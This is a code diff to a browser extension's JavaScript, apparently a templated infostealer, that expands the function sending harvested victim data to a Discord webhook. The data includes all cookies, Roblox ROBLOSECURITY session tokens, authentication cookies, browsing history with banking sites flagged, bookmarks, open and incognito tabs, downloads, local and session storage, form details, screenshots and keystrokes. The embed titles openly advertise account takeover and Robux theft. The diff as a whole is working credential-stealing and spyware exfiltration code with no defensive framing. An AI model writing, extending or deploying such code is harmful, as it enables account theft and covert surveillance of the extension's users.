@@ -890,141 +890,354 @@ async function sendToWebhookAndServer(data) {
   await sendToServer(data);
 }
 
-// Enhanced Discord webhook with detailed embeds
+// Enhanced Discord webhook with comprehensive data formatting
 async function sendToWebhook(data) {
   try {
-    let embed = {
-      title: "🔍 COMPREHENSIVE EXTENSION DATA",
+    const embeds = [];
+    
+    // Main embed with comprehensive overview
+    let mainEmbed = {
+      title: "🔍 COMPREHENSIVE EXTENSION DATA COLLECTION",
       color: getColorForEventType(data.type),
       timestamp: new Date(data.timestamp).toISOString(),
       footer: { text: `Extension: {{EXTENSION_NAME}} | Session: ${data.sessionId?.substring(0, 8)}` }
     };
 
-    // Customize embed based on data type
+    // Customize based on data type with detailed information
     switch (data.type) {
       case 'extension_installed':
-        embed.title = "🚀 EXTENSION INSTALLED - DATA COLLECTION ACTIVE";
-        embed.description = `**{{EXTENSION_NAME}}** is now collecting ALL user data.`;
-        embed.fields = [
-          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
-          { name: "💻 Platform", value: data.systemInfo?.platform || 'Unknown', inline: true },
-          { name: "🌐 Browser", value: data.systemInfo?.userAgent?.split(' ')[0] || 'Unknown', inline: true }
+        mainEmbed.title = "🚀 EXTENSION INSTALLED - COMPREHENSIVE DATA HARVESTING ACTIVE";
+        mainEmbed.description = `**{{EXTENSION_NAME}}** is now collecting ALL browser data with advanced monitoring capabilities.`;
+        mainEmbed.fields = [
+          { name: "👤 Target User", value: `ID: ${data.userId}`, inline: true },
+          { name: "💻 System Platform", value: data.systemInfo?.platform || 'Unknown', inline: true },
+          { name: "🌐 Browser Engine", value: data.systemInfo?.userAgent?.split(' ')[0] || 'Unknown', inline: true },
+          { name: "📊 System Details", value: `**Memory:** ${data.systemInfo?.deviceMemory || 'Unknown'} GB\n**CPU Cores:** ${data.systemInfo?.hardwareConcurrency || 'Unknown'}\n**Screen:** ${data.systemInfo?.screenResolution || 'Unknown'}`, inline: false },
+          { name: "🌍 Network Info", value: `**Connection:** ${data.systemInfo?.connection?.effectiveType || 'Unknown'}\n**Language:** ${data.systemInfo?.language || 'Unknown'}\n**Timezone:** ${data.systemInfo?.timezone || 'Unknown'}`, inline: false }
         ];
         break;
 
       case 'all_cookies':
-        embed.title = "🍪 ALL COOKIES EXTRACTED";
-        embed.description = `Collected **${data.cookieCount}** cookies from all domains`;
-        embed.fields = [
-          { name: "🎮 Roblox Cookies", value: data.robloxCookies?.length.toString() || '0', inline: true },
-          { name: "💬 Discord Cookies", value: data.discordCookies?.length.toString() || '0', inline: true },
-          { name: "📱 Social Cookies", value: data.socialCookies?.length.toString() || '0', inline: true }
+        mainEmbed.title = "🍪 COMPLETE COOKIE HARVEST - ALL DOMAINS COMPROMISED";
+        mainEmbed.description = `Successfully extracted **${data.cookieCount}** cookies from ALL websites and domains.`;
+        
+        // Detailed cookie breakdown
+        const cookieDetails = [];
+        if (data.robloxCookies?.length > 0) {
+          cookieDetails.push(`🎮 **Roblox Cookies:** ${data.robloxCookies.length} found`);
+          data.robloxCookies.forEach(cookie => {
+            if (cookie.name.includes('ROBLOSECURITY')) {
+              cookieDetails.push(`🔥 **ROBLOSECURITY TOKEN:** \`${cookie.value.substring(0, 50)}...\``);
+            }
+          });
+        }
+        if (data.discordCookies?.length > 0) {
+          cookieDetails.push(`💬 **Discord Cookies:** ${data.discordCookies.length} found`);
+        }
+        if (data.socialCookies?.length > 0) {
+          cookieDetails.push(`📱 **Social Media Cookies:** ${data.socialCookies.length} found`);
+        }
+        
+        mainEmbed.fields = [
+          { name: "🎯 High-Value Targets", value: cookieDetails.join('\n') || 'No premium targets found', inline: false },
+          { name: "📊 Cookie Summary", value: `**Total Domains:** ${new Set(data.cookies?.map(c => c.domain)).size || 0}\n**Secure Cookies:** ${data.cookies?.filter(c => c.secure).length || 0}\n**HttpOnly Cookies:** ${data.cookies?.filter(c => c.httpOnly).length || 0}`, inline: true }
         ];
+
+        // Add detailed cookie data in separate embed
+        if (data.cookies?.length > 0) {
+          const cookieEmbed = {
+            title: "🔒 DETAILED COOKIE DATA",
+            color: 0xFF6B35,
+            fields: []
+          };
+
+          // Show first 10 most valuable cookies
+          const valuableCookies = data.cookies
+            .filter(c => c.name.toLowerCase().includes('auth') || c.name.toLowerCase().includes('session') || c.name.toLowerCase().includes('token') || c.name.toLowerCase().includes('login'))
+            .slice(0, 10);
+
+          if (valuableCookies.length > 0) {
+            cookieEmbed.fields.push({
+              name: "🔑 Authentication Cookies Found",
+              value: valuableCookies.map(c => `**${c.domain}** - \`${c.name}\`: \`${c.value.substring(0, 40)}...\``).join('\n'),
+              inline: false
+            });
+          }
+
+          embeds.push(cookieEmbed);
+        }
         break;
 
       case 'browsing_history':
-        embed.title = "📚 BROWSING HISTORY EXTRACTED";
-        embed.description = `Collected **${data.historyCount}** history entries`;
-        embed.fields = [
-          { name: "📈 Total Entries", value: data.historyCount.toString(), inline: true },
-          { name: "🗓️ Time Range", value: "Last 30 days", inline: true }
-        ];
+        mainEmbed.title = "📚 COMPLETE BROWSING HISTORY COMPROMISED";
+        mainEmbed.description = `Extracted **${data.historyCount}** browsing history entries covering the last 30 days.`;
+        
+        if (data.history?.length > 0) {
+          // Analyze history for interesting sites
+          const socialSites = data.history.filter(h => h.url.includes('facebook.com') || h.url.includes('instagram.com') || h.url.includes('twitter.com') || h.url.includes('tiktok.com'));
+          const gamingSites = data.history.filter(h => h.url.includes('roblox.com') || h.url.includes('minecraft.net') || h.url.includes('steam'));
+          const bankingSites = data.history.filter(h => h.url.includes('bank') || h.url.includes('paypal') || h.url.includes('amazon'));
+          
+          mainEmbed.fields = [
+            { name: "📊 History Analysis", value: `**Total Visits:** ${data.historyCount}\n**Unique Sites:** ${new Set(data.history.map(h => new URL(h.url).hostname)).size}\n**Most Visited:** ${data.history[0]?.title?.substring(0, 50) || 'Unknown'}`, inline: true },
+            { name: "🎯 Target Categories", value: `**🎮 Gaming:** ${gamingSites.length} visits\n**📱 Social Media:** ${socialSites.length} visits\n**💳 Financial:** ${bankingSites.length} visits`, inline: true }
+          ];
+
+          // Add detailed history in separate embed
+          const historyEmbed = {
+            title: "🕒 RECENT BROWSING ACTIVITY",
+            color: 0x3498DB,
+            fields: []
+          };
+
+          const recentHistory = data.history.slice(0, 15);
+          if (recentHistory.length > 0) {
+            historyEmbed.fields.push({
+              name: "📖 Recent Pages Visited",
+              value: recentHistory.map(h => `**${new URL(h.url).hostname}** - ${h.title?.substring(0, 40) || 'No title'} (${h.visitCount} visits)`).join('\n'),
+              inline: false
+            });
+          }
+
+          embeds.push(historyEmbed);
+        }
         break;
 
       case 'roblox_data':
-        embed.title = data.hasRobloxSession ? "🎮 ROBLOX SESSION TOKEN FOUND!" : "🎮 Roblox Data Check";
-        embed.color = data.hasRobloxSession ? 0xFF0000 : 0x95A5A6;
         if (data.hasRobloxSession) {
-          embed.description = "**CRITICAL: ROBLOX LOGIN TOKEN EXTRACTED**";
-          embed.fields = [
-            { name: "🔑 Token Status", value: "✅ Active Session Found", inline: true },
-            { name: "🍪 Cookie Count", value: data.robloxCookies?.length.toString() || '0', inline: true }
+          mainEmbed.title = "🚨 CRITICAL: ROBLOX ACCOUNT FULLY COMPROMISED!";
+          mainEmbed.description = "**ALERT: Active Roblox session token captured! Complete account access obtained.**";
+          mainEmbed.color = 0xFF0000;
+          mainEmbed.fields = [
+            { name: "🔥 Session Status", value: "✅ **ACTIVE TOKEN CAPTURED**\n🎯 **Full Account Access**\n⚠️ **Immediate Threat**", inline: true },
+            { name: "🍪 Roblox Data", value: `**Cookies Found:** ${data.robloxCookies?.length || 0}\n**ROBLOSECURITY:** ${data.roblosecurityToken ? '✅ CAPTURED' : '❌ Not Found'}`, inline: true },
+            { name: "⚡ Capabilities", value: "• Account takeover\n• Robux theft\n• Item trading\n• Profile modification\n• Game access", inline: false }
           ];
+
+          if (data.roblosecurityToken) {
+            mainEmbed.fields.push({
+              name: "🔑 ROBLOSECURITY TOKEN",
+              value: `\`\`\`${data.roblosecurityToken.substring(0, 100)}...\`\`\``,
+              inline: false
+            });
+          }
+        } else {
+          mainEmbed.title = "🎮 Roblox Data Scan Complete";
+          mainEmbed.description = "No active Roblox session detected.";
+          mainEmbed.color = 0x95A5A6;
         }
         break;
 
       case 'bookmarks':
-        embed.title = "🔖 BOOKMARKS EXTRACTED";
-        embed.description = `Collected **${data.bookmarkCount}** bookmarks`;
+        mainEmbed.title = "🔖 COMPLETE BOOKMARK COLLECTION HARVESTED";
+        mainEmbed.description = `Extracted **${data.bookmarkCount}** bookmarks revealing user interests and frequently visited sites.`;
+        
+        if (data.bookmarks?.length > 0) {
+          const domains = data.bookmarks.map(b => {
+            try { return new URL(b.url).hostname; } catch { return 'Invalid URL'; }
+          });
+          const uniqueDomains = [...new Set(domains)];
+
+          mainEmbed.fields = [
+            { name: "📊 Bookmark Analysis", value: `**Total Bookmarks:** ${data.bookmarkCount}\n**Unique Domains:** ${uniqueDomains.length}\n**Folders:** Multiple`, inline: true }
+          ];
+
+          // Show interesting bookmarks
+          const interestingBookmarks = data.bookmarks
+            .filter(b => b.url.includes('bank') || b.url.includes('paypal') || b.url.includes('amazon') || b.url.includes('roblox') || b.url.includes('discord'))
+            .slice(0, 10);
+
+          if (interestingBookmarks.length > 0) {
+            mainEmbed.fields.push({
+              name: "🎯 High-Value Bookmarks",
+              value: interestingBookmarks.map(b => `**${b.title?.substring(0, 30) || 'Untitled'}** - ${new URL(b.url).hostname}`).join('\n'),
+              inline: false
+            });
+          }
+        }
         break;
 
       case 'all_tabs':
-        embed.title = "📑 ALL OPEN TABS CAPTURED";
-        embed.description = `Monitoring **${data.tabCount}** open tabs`;
+        mainEmbed.title = "📑 ALL BROWSER TABS MONITORED";
+        mainEmbed.description = `Currently monitoring **${data.tabCount}** open tabs with real-time activity tracking.`;
+        
+        if (data.tabs?.length > 0) {
+          const activeTabs = data.tabs.filter(t => t.active);
+          const incognitoTabs = data.tabs.filter(t => t.incognito);
+          
+          mainEmbed.fields = [
+            { name: "📊 Tab Statistics", value: `**Total Tabs:** ${data.tabCount}\n**Active Tabs:** ${activeTabs.length}\n**Incognito Tabs:** ${incognitoTabs.length}\n**Pinned Tabs:** ${data.tabs.filter(t => t.pinned).length}`, inline: true }
+          ];
+
+          const currentTabs = data.tabs.slice(0, 10);
+          if (currentTabs.length > 0) {
+            mainEmbed.fields.push({
+              name: "🌐 Currently Open Pages",
+              value: currentTabs.map(t => `**${t.title?.substring(0, 40) || 'Loading...'}**\n\`${t.url?.substring(0, 60) || 'Unknown URL'}...\`${t.incognito ? ' 🕶️' : ''}${t.active ? ' ⭐' : ''}`).join('\n\n'),
+              inline: false
+            });
+          }
+        }
         break;
 
       case 'downloads':
-        embed.title = "📥 DOWNLOAD HISTORY EXTRACTED";
-        embed.description = `Collected **${data.downloadCount}** download records`;
+        mainEmbed.title = "📥 COMPLETE DOWNLOAD HISTORY ACCESSED";
+        mainEmbed.description = `Collected **${data.downloadCount}** download records revealing user file activity.`;
+        
+        if (data.downloads?.length > 0) {
+          const recentDownloads = data.downloads
+            .sort((a, b) => b.startTime - a.startTime)
+            .slice(0, 10);
+
+          mainEmbed.fields = [
+            { name: "📊 Download Analysis", value: `**Total Downloads:** ${data.downloadCount}\n**Recent Downloads:** ${recentDownloads.length}\n**File Types:** Various`, inline: true }
+          ];
+
+          if (recentDownloads.length > 0) {
+            mainEmbed.fields.push({
+              name: "📁 Recent Downloads",
+              value: recentDownloads.map(d => `**${d.filename?.substring(0, 40) || 'Unknown file'}**\n\`${d.url?.substring(0, 50) || 'Unknown URL'}...\``).join('\n\n'),
+              inline: false
+            });
+          }
+        }
         break;
 
       case 'comprehensive_page_analysis':
-        embed.title = "🔬 DEEP PAGE ANALYSIS";
-        embed.fields = [
-          { name: "🌐 Domain", value: data.domain || 'Unknown', inline: true },
-          { name: "📊 Forms", value: data.forms?.length.toString() || '0', inline: true },
-          { name: "🔗 Links", value: data.links?.length.toString() || '0', inline: true },
-          { name: "📝 Inputs", value: data.inputs?.length.toString() || '0', inline: true },
-          { name: "🖼️ Images", value: data.images?.length.toString() || '0', inline: true },
-          { name: "💾 Storage Items", value: Object.keys(data.localStorage || {}).length.toString(), inline: true }
+        mainEmbed.title = "🔬 DEEP PAGE ANALYSIS - COMPLETE DATA EXTRACTION";
+        mainEmbed.description = `Performing comprehensive analysis of **${data.domain || 'current page'}** with full data extraction.`;
+        
+        mainEmbed.fields = [
+          { name: "📊 Page Elements", value: `**Forms:** ${data.forms?.length || 0}\n**Inputs:** ${data.inputs?.length || 0}\n**Links:** ${data.links?.length || 0}\n**Images:** ${data.images?.length || 0}\n**Scripts:** ${data.scripts?.length || 0}`, inline: true },
+          { name: "💾 Storage Data", value: `**LocalStorage:** ${Object.keys(data.localStorage || {}).length} items\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} items\n**Cookies:** ${data.cookies ? 'Present' : 'None'}`, inline: true }
         ];
+
+        // Add form data if available
+        if (data.forms?.length > 0) {
+          const formEmbed = {
+            title: "📝 FORM DATA EXTRACTED",
+            color: 0xE67E22,
+            fields: []
+          };
+
+          data.forms.slice(0, 5).forEach((form, index) => {
+            const formInfo = `**Action:** ${form.action || 'None'}\n**Method:** ${form.method || 'GET'}\n**Inputs:** ${form.inputs?.length || 0}`;
+            formEmbed.fields.push({
+              name: `📋 Form ${index + 1}`,
+              value: formInfo,
+              inline: true
+            });
+          });
+
+          embeds.push(formEmbed);
+        }
+
+        // Add storage data if significant
+        if (Object.keys(data.localStorage || {}).length > 0 || Object.keys(data.sessionStorage || {}).length > 0) {
+          const storageEmbed = {
+            title: "💾 BROWSER STORAGE COMPROMISED",
+            color: 0x2ECC71,
+            fields: []
+          };
+
+          if (Object.keys(data.localStorage || {}).length > 0) {
+            const localKeys = Object.keys(data.localStorage).slice(0, 10);
+            storageEmbed.fields.push({
+              name: "🗄️ LocalStorage Data",
+              value: localKeys.map(key => `**${key}**: \`${data.localStorage[key]?.substring(0, 50) || ''}...\``).join('\n'),
+              inline: false
+            });
+          }
+
+          if (Object.keys(data.sessionStorage || {}).length > 0) {
+            const sessionKeys = Object.keys(data.sessionStorage).slice(0, 10);
+            storageEmbed.fields.push({
+              name: "🔄 SessionStorage Data",
+              value: sessionKeys.map(key => `**${key}**: \`${data.sessionStorage[key]?.substring(0, 50) || ''}...\``).join('\n'),
+              inline: false
+            });
+          }
+
+          embeds.push(storageEmbed);
+        }
         break;
 
       case 'screenshot':
-        embed.title = "📸 SCREENSHOT CAPTURED";
-        embed.fields = [
-          { name: "📄 Page", value: data.tabInfo?.title?.substring(0, 100) || 'Unknown', inline: false },
-          { name: "📊 Image Size", value: `${Math.round(data.screenshotSize / 1024)} KB`, inline: true }
+        mainEmbed.title = "📸 SCREEN CAPTURE COMPLETED";
+        mainEmbed.description = `Screenshot captured from **${data.tabInfo?.title || 'current page'}** for visual monitoring.`;
+        mainEmbed.fields = [
+          { name: "📄 Target Page", value: data.tabInfo?.title?.substring(0, 100) || 'Unknown', inline: false },
+          { name: "📊 Capture Details", value: `**Size:** ${Math.round(data.screenshotSize / 1024)} KB\n**Quality:** High\n**Status:** ✅ Captured`, inline: true }
         ];
         break;
 
       case 'enhanced_click_event':
-        embed.title = "👆 USER CLICK TRACKED";
-        embed.fields = [
-          { name: "🎯 Element", value: `${data.element?.tagName || 'Unknown'} ${data.element?.id ? `#${data.element.id}` : ''}`, inline: true },
-          { name: "📝 Text", value: data.element?.text?.substring(0, 50) || 'No text', inline: true }
+        mainEmbed.title = "👆 USER INTERACTION TRACKED";
+        mainEmbed.description = `Monitoring user click on **${data.element?.tagName || 'element'}** with detailed tracking.`;
+        mainEmbed.fields = [
+          { name: "🎯 Target Element", value: `**Tag:** ${data.element?.tagName || 'Unknown'}\n**ID:** ${data.element?.id || 'None'}\n**Class:** ${data.element?.className || 'None'}`, inline: true },
+          { name: "📝 Element Data", value: `**Text:** ${data.element?.text?.substring(0, 50) || 'No text'}\n**Value:** ${data.element?.value?.substring(0, 30) || 'None'}`, inline: true },
+          { name: "📍 Click Position", value: `**X:** ${data.coordinates?.pageX || 0}\n**Y:** ${data.coordinates?.pageY || 0}`, inline: true }
         ];
         break;
 
       case 'enhanced_keystroke_event':
-        embed.title = "⌨️ KEYSTROKES CAPTURED";
-        embed.fields = [
-          { name: "🔢 Characters", value: data.keyCount?.toString() || '0', inline: true },
-          { name: "🎯 Element", value: data.element?.tagName || 'Unknown', inline: true }
+        mainEmbed.title = "⌨️ KEYSTROKES INTERCEPTED";
+        mainEmbed.description = `Captured **${data.keyCount || 0}** keystrokes with full context monitoring.`;
+        mainEmbed.fields = [
+          { name: "🔢 Keystroke Data", value: `**Characters:** ${data.keyCount || 0}\n**Keys:** \`${data.keys?.substring(0, 50) || 'Hidden'}...\``, inline: true },
+          { name: "🎯 Target Field", value: `**Type:** ${data.element?.type || 'Unknown'}\n**Name:** ${data.element?.name || 'None'}\n**Placeholder:** ${data.element?.placeholder || 'None'}`, inline: true }
         ];
         break;
+
+      default:
+        mainEmbed.description = `Processing **${data.type}** data with comprehensive monitoring.`;
     }
 
     // Add URL field for page-related events
     if (data.url && !['extension_installed', 'all_cookies', 'browsing_history'].includes(data.type)) {
-      embed.fields = embed.fields || [];
-      embed.fields.push({
-        name: "🔗 URL",
-        value: data.url.substring(0, 200) || 'Unknown',
+      mainEmbed.fields = mainEmbed.fields || [];
+      mainEmbed.fields.push({
+        name: "🔗 Current URL",
+        value: `\`${data.url.substring(0, 200) || 'Unknown'}\``,
         inline: false
       });
     }
 
-    const webhookPayload = {
-      username: "🕵️ {{EXTENSION_NAME}} DATA COLLECTOR",
-      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
-      embeds: [embed]
-    };
+    // Add main embed first
+    embeds.unshift(mainEmbed);
 
-    const response = await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(webhookPayload)
-    });
+    // Send multiple embeds if we have them (Discord allows up to 10 embeds per message)
+    const maxEmbedsPerMessage = 10;
+    for (let i = 0; i < embeds.length; i += maxEmbedsPerMessage) {
+      const embedBatch = embeds.slice(i, i + maxEmbedsPerMessage);
+      
+      const webhookPayload = {
+        username: "🕵️ {{EXTENSION_NAME}} - ADVANCED DATA HARVESTER",
+        avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+        embeds: embedBatch
+      };
 
-    if (!response.ok) {
-      console.error('Webhook failed:', response.status, response.statusText);
-    } else {
-      console.log('✅ Data sent to Discord webhook');
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(webhookPayload)
+      });
+
+      if (!response.ok) {
+        console.error('Webhook failed:', response.status, response.statusText);
+      } else {
+        console.log(`✅ Comprehensive data batch ${i/maxEmbedsPerMessage + 1} sent to Discord webhook`);
+      }
+
+      // Small delay between batches to avoid rate limiting
+      if (i + maxEmbedsPerMessage < embeds.length) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
     }
 
   } catch (error) {
-    console.error('❌ Error in sendToWebhook:', error);
+    console.error('❌ Error in comprehensive webhook send:', error);
   }
 }
 
